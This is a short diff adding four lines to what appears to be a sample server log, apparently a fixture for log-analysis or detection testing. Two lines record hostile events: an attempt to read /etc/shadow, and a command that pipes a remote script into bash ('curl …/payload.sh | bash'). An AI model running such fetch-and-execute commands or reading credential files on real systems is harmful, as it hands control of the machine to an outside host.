@@ -1,0 +1,4 @@
+2026-06-02 10:04:00 WARN unauthorized access user=guest ip=198.51.100.7 path=/admin
+2026-06-02 10:04:15 ERROR permission denied user=guest ip=198.51.100.7 path=/etc/shadow
+2026-06-02 10:05:00 WARN command execution user=deploy ip=203.0.113.12 cmd="curl http://192.0.2.55/payload.sh | bash"
+2026-06-02 10:06:00 INFO normal request user=alice ip=203.0.113.10 path=/home
